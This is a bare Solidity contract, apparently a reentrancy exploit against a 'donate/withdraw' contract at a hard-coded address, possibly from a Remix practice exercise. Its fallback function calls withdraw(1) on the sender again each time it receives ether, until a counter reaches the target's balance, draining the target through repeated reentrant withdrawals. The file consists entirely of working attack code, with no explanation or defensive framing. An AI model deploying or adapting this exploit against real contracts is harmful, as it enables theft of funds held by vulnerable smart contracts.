contract interactor{
    address public target=0xd9145CCE52D386f254917e481eB44e9943F39138;
    uint32 public i = 0;
    constructor() payable {}
    function calldonate(address _to,uint val) public payable
    {
        target.call{value:val}(abi.encodeWithSignature("donate(address)", _to));
    }
    function callwithdraw() public 
    {
        target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
    }
    fallback() external payable {
        i++;
        require(i<target.balance);
        msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", 1));
    }
}
